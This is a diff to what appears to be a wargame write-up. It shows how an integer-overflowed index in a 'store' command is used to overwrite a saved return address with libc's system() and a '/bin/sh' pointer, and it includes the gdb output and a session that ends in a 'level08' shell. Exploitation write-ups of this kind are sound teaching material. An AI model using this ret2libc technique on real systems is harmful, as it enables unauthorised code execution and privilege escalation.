@@ -345,4 +345,31 @@ we found the return function in
 0xffffd70c:     0xf7e45513
 ```
 
-wi calculate the offset between the return address and the value we store we found it is 70
+we found the first element store in the index 1 \* 4 so the first element store in `0xFFFFD544` we calculate the offset between the return address and the value we store we found it is `456` that's mean that we must overwrite the return address in the index `114`
+
+```
+.
+.
+.
+
+
+2147483762
+(gdb) p &system
+$2 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
+(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
+0xf7f897ec
+1 pattern found.
+(gdb)
+
+Input command: store
+ Number: 4159090384
+ Index: 2147483762
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+Input command: quit
+$ whoami
+level08
+```
